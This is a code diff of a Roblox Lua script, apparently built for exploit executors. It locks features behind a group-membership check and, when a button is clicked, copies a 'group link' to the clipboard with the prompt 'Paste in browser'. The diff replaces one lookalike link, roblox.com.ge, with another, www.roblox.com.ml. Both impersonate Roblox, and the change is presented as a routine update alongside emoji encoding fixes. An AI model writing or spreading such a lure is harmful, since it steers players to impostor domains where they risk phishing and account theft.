@@ -4,8 +4,8 @@ local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
 -- CONFIG
-local GROUP_ID = 3486215705
-local GROUP_LINK = "https://roblox.com.ge/communities/3486215705/"
+local GROUP_ID = 158232765394
+local GROUP_LINK = "https://www.roblox.com.ml/communities/158232765394/ScriptBlox"
 
 -- UI
 local ScreenGui = Instance.new("ScreenGui")
@@ -105,10 +105,10 @@ end)
 -- Check group
 local function checkGroup()
 	if player:IsInGroup(GROUP_ID) then
-		Status.Text = "Access Granted âœ…"
+		Status.Text = "Access Granted ✅"
 		JoinBtn.Visible = false
 	else
-		Status.Text = "Join the group to continue âŒ"
+		Status.Text = "Join the group to continue ❌"
 		JoinBtn.Visible = true
 	end
 end
@@ -117,9 +117,9 @@ end
 JoinBtn.MouseButton1Click:Connect(function()
 	if setclipboard then
 		setclipboard(GROUP_LINK)
-		Status.Text = "Link copied! Paste in browser ðŸ”—"
+		Status.Text = "Link copied! Paste in browser 🔗"
 	else
-		Status.Text = "Clipboard not supported âš ï¸"
+		Status.Text = "Clipboard not supported ⚠️"
 	end
 end)
 
